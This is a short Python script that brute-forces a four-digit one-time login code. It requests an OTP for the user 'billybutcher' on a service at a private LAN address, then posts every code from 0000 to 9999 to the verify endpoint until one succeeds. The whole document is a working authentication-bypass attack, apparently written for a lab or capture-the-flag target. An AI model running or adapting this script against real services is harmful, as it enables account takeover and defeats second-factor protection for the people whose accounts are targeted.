import requests

url="http://192.168.1.89:9000"
username="billybutcher"
data={
    "username":username
}
requests.post(f"{url}/login/otp/request/",json=data)

for i in range(10000):
    code=f"{i:04d}"
    data1={
        "username":username,
        "code":code
    }
    response=requests.post(f"{url}/login/otp/verify/",json=data1)
    result=response.json()

    if result.get("success") == True:
        print("login")
        print(code)
        break
    else:
        print(code)
